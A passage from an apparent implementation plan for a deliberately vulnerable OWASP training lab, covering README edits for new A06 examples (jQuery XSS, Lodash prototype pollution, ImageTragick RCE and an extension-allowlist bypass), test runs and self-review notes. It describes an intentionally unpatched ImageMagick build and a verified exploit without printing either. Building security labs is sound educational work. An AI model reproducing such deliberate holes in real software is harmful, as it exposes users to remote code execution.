and Outdated Components** (component version disclosure, outdated JS library detection,
jQuery DOM XSS via a real CVE, jQuery XSS chained to session-token theft, Lodash
prototype pollution via a real CVE, prototype pollution bypassing a client-side access
check), **A07 Identification and Authentication Failures**
```
change it to:
```
), **A06 Vulnerable
and Outdated Components** (component version disclosure, outdated JS library detection,
jQuery DOM XSS via a real CVE, jQuery XSS chained to session-token theft, Lodash
prototype pollution via a real CVE, prototype pollution bypassing a client-side access
check, remote code execution via a real, unpatched ImageMagick build [CVE-2016-3714,
"ImageTragick"], and that same RCE bypassing a naive image-extension allowlist),
**A07 Identification and Authentication Failures**
```

**Note:** read this exact paragraph fresh from the live file before editing (do not assume the wrap points above match character-for-character) — this plan's own established practice (multiple prior rounds' self-reviews caught real mismatches this way) is to treat the real file's current text as source of truth and only insert the new clause.

- [ ] **Step 5: Update README.md's category summary table**

Change the A06 row, currently (verified fresh against the real file — `README.md` line 147; note this table uses SHORTER abbreviated titles than the full `ExampleNav.title` strings — match that abbreviated style):
```
| A06 Vulnerable and Outdated Components | Implemented | Component Version Disclosure (Easy), Outdated Vulnerable JS Library Detection (Easy), jQuery DOM XSS via Vulnerable htmlPrefilter (Medium), Lodash Prototype Pollution via _.defaultsDeep() (Medium), jQuery DOM XSS Chained to Session Token Theft (Hard), Prototype Pollution Bypasses a Client-Side Access Check (Hard) |
```
to:
```
| A06 Vulnerable and Outdated Components | Implemented | Component Version Disclosure (Easy), Outdated Vulnerable JS Library Detection (Easy), jQuery DOM XSS via Vulnerable htmlPrefilter (Medium), Lodash Prototype Pollution via _.defaultsDeep() (Medium), jQuery DOM XSS Chained to Session Token Theft (Hard), Prototype Pollution Bypasses a Client-Side Access Check (Hard), ImageTragick RCE via Image Upload (Medium), ImageTragick Bypasses an Image-Extension Allowlist (Hard) |
```

- [ ] **Step 6: Update README.md's Quick start section**

Change the Quick start section, currently (verified fresh against the real file — `README.md` lines 78-88):
```
## Quick start

```bash
git clone https://github.com/jozeta/owasp-lab.git
cd owasp-lab
cp .env.example .env      # edit SECRET_KEY if you like; defaults work for local use
docker compose up --build
```

Then open <http://127.0.0.1:5001>. The database auto-seeds on first run with
synthetic accounts (`alice`, `bob`, `carol`, `admin`) — no real data is ever used.
```
to (adding one sentence noting the first build compiles a vendored ImageMagick release from source, so it takes noticeably longer than a typical rebuild — no invented exact timing numbers):
```
## Quick start

```bash
git clone https://github.com/jozeta/owasp-lab.git
cd owasp-lab
cp .env.example .env      # edit SECRET_KEY if you like; defaults work for local use
docker compose up --build
```

The first build compiles a vendored, intentionally-unpatched ImageMagick release
from source (for the A06 ImageTragick example) and takes noticeably longer than a
typical rebuild — later rebuilds are fast again since Docker caches that layer.

Then open <http://127.0.0.1:5001>. The database auto-seeds on first run with
synthetic accounts (`alice`, `bob`, `carol`, `admin`) — no real data is ever used.
```

- [ ] **Step 7: Run the full test suite**

Run: `pytest -q`
Expected: green, zero failures. Compute the exact expected pass/skip count from the actual new-test counts across Tasks 1-2 (Task 1 has no tests; Task 2 adds 5 tests, 2 of which skip locally) plus the prior baseline (588 passed + 1 skipped) — expect approximately `591 passed, 3 skipped` locally, but **verify this arithmetic against the actual observed counts from Task 2's own Step 7/9 runs rather than trusting this estimate blindly** (this plan's own practice from every prior round: never trust a predicted count over an actually-observed one).

- [ ] **Step 8: Commit**

```bash
git add tests/test_all_examples_have_hints.py tests/test_hints.py README.md
git commit -m "test(nav): update total/max-score assertions and README for 2 new A06 examples"
```

---

## Self-Review Notes (for the plan author, not an execution step)

**Spec coverage:** both examples from the spec are fully covered by Tasks 1-2, including the exact vendored-tarball path and sha256, the exact verified compile recipe, the exact verified exploit payload, and the exact verified extension-bypass mechanism.

**Placeholder scan:** no TBD/TODO; every step has literal, complete code, Dockerfile content, and test code.

**Type/naming consistency:** both new route names match their `ExampleNav.endpoint` values. `IMAGETRAGICK_PROOF_PATH` is defined once in `routes.py` and imported by name in the test file, matching the exact precedent of `ARGUMENT_INJECTION_PROOF_PATH` in `tests/test_a03_argument_injection.py`.

**Verified, not assumed:** unlike every prior round's plans (which typically verified one specific runtime-behavior question before finalizing), this plan's ENTIRE premise was verified end-to-end multiple times before being written: the exact Dockerfile diff in Task 1 was built as a standalone test image and the exact exploit payload in Task 2 was confirmed to genuinely fire inside that exact built image (a proof file was created via the real HTTPS delegate mechanism), and the extension-bypass premise (ImageMagick ignores the filename, detects content) was independently confirmed by the same test run (the payload file was named `.jpg` throughout).

**Task ordering:** Task 1 (Docker infra) must land before Task 2's Step 7b (manual Docker-based verification) can be performed, though Task 2's Flask/Python code itself has no hard dependency on Task 1 having landed first for the code to be syntactically/logically correct — the plan runs them in this order to match the natural verification story (infra first, then the feature that depends on it).

**Task 3's final assertions:** the 103→105 and 2220→2270 changes are arithmetically exact (Task 2: +1 Medium (+20) +1 Hard (+30) = +50). Task 3 Step 1 has the implementer verify the actual total before touching any assertion, rather than trusting this arithmetic blindly, matching this plan's own Global Constraints spirit and the practice established in every prior round's final task.

**README.md's exact current text, verified fresh during self-review (not left as "read fresh" placeholders):** the A06 intro-paragraph clause, the A06 category-table row, and the Quick start section were all read directly from the real file during this self-review pass and are quoted verbatim in Task 3 Steps 4-6 — closing the exact class of gap prior rounds' self-reviews have caught (an unverified guess at exact wording that turned out wrong).
